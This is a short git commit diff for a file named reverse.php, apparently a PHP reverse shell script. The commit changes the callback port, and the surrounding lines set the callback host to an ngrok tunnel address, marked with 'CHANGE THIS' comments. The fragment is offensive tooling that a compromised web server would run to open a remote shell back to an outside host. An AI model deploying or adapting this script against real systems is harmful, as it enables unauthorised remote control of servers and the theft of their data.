2930b9ba67d13d6e753ea62f01553fa85f27b094
myst <148803603+c1thu@users.noreply.github.com>
2024-09-10 20:30:35 +0630

    Update reverse.php

--- reverse.php
+++ reverse.php
@@ -2,7 +2,7 @@
 set_time_limit (0);
 $VERSION = "1.0";
 $ip = '0.tcp.ap.ngrok.io';  // CHANGE THIS
-$port = 11717;       // CHANGE THIS
+$port = 10288;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
